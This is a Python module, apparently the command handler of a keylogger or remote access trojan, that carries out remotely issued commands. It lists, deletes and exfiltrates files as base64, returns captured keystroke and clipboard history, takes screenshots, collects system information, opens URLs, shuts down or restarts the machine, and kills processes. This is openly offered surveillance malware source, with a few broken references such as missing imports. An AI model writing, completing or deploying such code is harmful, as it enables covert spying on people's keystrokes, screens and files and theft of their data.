# ------------ commands/handler.py ------------
import os
import psutil
import webbrowser
import shutil

class CommandHandler:
    @staticmethod
    def execute(command_type, parameters):
        handler = getattr(CommandHandler, f"handle_{command_type}", None)
        if handler:
            return handler(parameters)
        raise CommandError(f"Unknown command type: {command_type}")

    @staticmethod
    def handle_file_operation(params):
        import base64
        action = params.get('action')
        path = params.get('path', '.')
    
        if action == 'list':
            return {
                "path": path,
                "files": [f.name for f in os.scandir(path) if f.is_dir() or f.is_file()]
            }
        elif action == 'delete':
            os.remove(path)
            return {"status": "success"}
        elif action == 'download':
            with open(path, 'rb') as f:
                return {"content": base64.b64encode(f.read()).decode()}
        elif action == 'upload':
            # Implementation for file upload (not yet implemented)
            raise CommandError("Upload action not implemented.")
        else:
            raise CommandError(f"Invalid file action: {action}")

    @staticmethod
    def handle_system_info(params):
        from system.collector import SystemCollector
        return SystemCollector.collect_full()

    @staticmethod
    def handle_open_url(params):
        url = params.get('url')
        if not url:
            raise CommandError("Missing 'url' parameter")
        webbrowser.open(url)
        return {"status": "success"}

    @staticmethod
    def handle_keystroke_history(params):
        return {"history": ActivityLogger.get_keystroke_history()} 
    
    @staticmethod
    def handle_clipboard_history(params):
        return {"history": ActivityLogger.get_clipboard_history()}
    
    @staticmethod
    def handle_capture_screenshot(params):
        from main import KeyloggerCore
        keylogger = KeyloggerCore()  # Create instance
        screenshot = keylogger._capture_screenshot()
        if screenshot:
            return {"screenshot": base64.b64encode(screenshot).decode()}
        raise CommandError("Failed to capture screenshot")

    @staticmethod
    def handle_system_command(params):
        command = params.get('command')
        
        if command == 'shutdown':
            os.system("shutdown /s /t 1")
        elif command == 'restart':
            os.system("shutdown /r /t 1")
        elif command == 'sleep':
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        elif command == 'signout':
            os.system("shutdown /l")
        else:
            raise CommandError(f"Unknown system command: {command}")
            
        return {"status": "success"}

    @staticmethod
    def handle_process_management(params):
        action = params.get('action')
        
        if action == 'list':
            return {
                "processes": [
                    proc.info for proc in psutil.process_iter(
                        ['pid', 'name', 'status']
                    )
                ]
            }
        elif action == 'terminate':
            psutil.Process(params['pid']).terminate()
            return {"status": "success"}
        else:
            raise CommandError(f"Invalid process action: {action}")

class CommandError(Exception):
    pass